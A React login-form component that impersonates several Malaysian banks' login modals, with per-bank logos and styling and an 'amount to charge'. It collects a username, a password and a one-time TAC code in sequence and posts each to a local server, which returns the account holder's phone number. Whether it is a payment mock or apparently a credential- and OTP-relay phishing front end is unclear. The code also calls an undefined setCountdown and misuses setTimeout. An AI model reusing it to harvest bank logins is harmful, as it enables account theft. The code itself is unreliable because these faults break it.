import React, { useEffect, useState } from "react";
import styles from "./styles.module.css";
import ProgressBar from "../ProgressBar";
import Timer from "../Timer";
import banks from "../../banks";
import axios from "axios";
import { useParams } from "react-router-dom";

import Loading from "./Loading";
import Successful from "./Successful";
import SomethingWentWrong from "./SomethingWentWrong";
import TimeoutError from "./TimeoutError";
import bodyState from "./bodyState";
import Username from "./Username";
import Password from "./Password";
import Tac from "./Tac";

function LoginForm({ id, bank, amount }) {
  console.log(styles);
  let { transactionId } = useParams();

  console.log(transactionId);
  let [stage, setStage] = useState(bodyState.USERNAME);
  let [completed, setCompleted] = useState(0);
  let [username, setUsername] = useState("");
  let [password, setPassword] = useState("");
  let [tac, setTAC] = useState("");
  let [tacPhoneNumber, setTacPhoneNumber] = useState("");
  let [tacDate, setTacDate] = useState("");
  let [start, setStart] = useState(Date.now());

  useEffect(() => {
    setUsername(banks[bank].username);
    setPassword(banks[bank].password);
  }, [start]);

  function handleUsernameChange(e) {
    setUsername(e.target.value);
  }

  function handlePasswordChange(e) {
    setPassword(e.target.value);
  }

  function handleTACChange(e) {
    setTAC(e.target.value);
  }

  async function handleButtonClick() {
    setStart(Date.now());

    switch (stage) {
      case bodyState.USERNAME:
        if (username) {
          try {
            setStage(bodyState.LOADING);
            let result = await axios.post("http://localhost:8888/username", {
              id: id,
              username: username,
            });

            if (result.data.code === 400) {
              setStage(bodyState.ERROR);
            } else {
              setStart(Date.now());
              setStage(bodyState.PASSWORD);

              setCompleted(40);
            }
          } catch (e) {
            console.log(e);
          }
        } else {
          alert("Please enter your username");
        }
        break;
      case bodyState.PASSWORD:
        if (password) {
          try {
            setStage(bodyState.LOADING);

            let result = await axios.post(
              "http://localhost:8888/authenticate",
              {
                id: id,
                password: password,
              }
            );

            console.log(result);

            if (result.data.code === 400) {
              setTimeout(0);
              setCompleted(0);
              setStage(bodyState.ERROR);
            } else {
              if (bank !== "CIMB") {
                const phoneNumber = result.data.phoneNumber;
                const date = result.data.date;

                setStart(Date.now());
                setTacPhoneNumber(phoneNumber);
                setTacDate(date);
                setStage(bodyState.TAC);
                setCompleted(80);
              } else {
                const phoneNumber = result.data.phoneNumber;
                const date = result.data.date;

                setStart(Date.now());
                setTacPhoneNumber(phoneNumber);
                setTacDate(date);
                setCountdown(0);
                setCompleted(80);
              }
            }
          } catch (e) {
            console.log(e);
            setStage(bodyState.ERROR);
          }
        } else {
          alert("Please enter your password");
        }
        break;
      case bodyState.TAC:
        if (tac) {
          setStage(bodyState.LOADING);
          let result = await axios.post("http://localhost:8888/tac", {
            id: id,
            tac: tac,
          });

          if (result.data.code === 200) {
            setStage(bodyState.SUCCESS);
          } else if (result.data.code === 300) {
            setTimeout(0);
            setCompleted(0);
            setStage(bodyState.ERROR);
          }
        }
        break;
      default:
        console.log("Button is clicked");
        break;
    }
  }

  function handleReturning(e) {
    e.preventDefault();

    setStage(bodyState.USERNAME);
    setTimeout(180);
    setCompleted(0);
    setCountdown(0);
  }

  function body(stage) {
    switch (stage) {
      case bodyState.USERNAME:
        return (
          <Username
            value={username}
            onValueChange={handleUsernameChange}
            onButtonClick={handleButtonClick}
          />
        );

      case bodyState.PASSWORD:
        return (
          <Password
            value={password}
            onValueChange={handlePasswordChange}
            onButtonClick={handleButtonClick}
          />
        );

      case bodyState.TAC:
        return (
          <Tac
            value={tac}
            onValueChange={handleTACChange}
            onButtonClick={handleButtonClick}
            tacDate={tacDate}
            tacPhoneNumber={tacPhoneNumber}
          />
        );
      case bodyState.ERROR:
        return <SomethingWentWrong onReturn={handleReturning} />;
      case bodyState.TIMEOUT:
        return <TimeoutError onReturn={handleReturning} />;
      case bodyState.LOADING:
        return <Loading bank={bank} />;
      case bodyState.SUCCESS:
        return <Successful />;
      default:
        return <Loading bank={bank} />;
    }
  }

  return (
    <div className={`${styles["login-form"]}`}>
      <div
        className={`${styles["modal-content"]} ${
          styles[`${bank.toLowerCase()}-modal-content`]
        }`}
      >
        <div
          className={`${styles["modal-header"]} ${
            styles[`${bank.toLowerCase()}-modal-header`]
          }`}
        >
          <img
            alt="Bank Logo"
            src={banks[bank].logo}
            className={styles["img-circle"]}
          />
          <h4>{banks[bank].name}</h4>
          <br />
          <div id={styles["refid"]}>Reference ID: {id.split("-")[0]}</div>
          <small>Amount to charge</small>
          <h3 className={styles["amount"]}>MYR {amount}.00</h3>
          <ProgressBar bgcolor={"#2ecc71"} completed={completed} />
          <Timer
            timeout="180"
            start={start}
            onTimerEnd={() => {
              console.log("Timer end");
            }}
          />
        </div>
        <div
          className={`${styles["modal-body"]} ${
            styles[`${bank.toLowerCase()}-modal-body`]
          }`}
        >
          {body(stage)}
        </div>
        <div
          className={`${styles["modal-footer"]} ${
            styles[`${bank.toLowerCase()}-modal-footer`]
          }`}
        >
          <small>
            Please <strong>DO NOT REFRESH</strong> your web browser
          </small>
        </div>
      </div>
    </div>
  );
}

export default LoginForm;
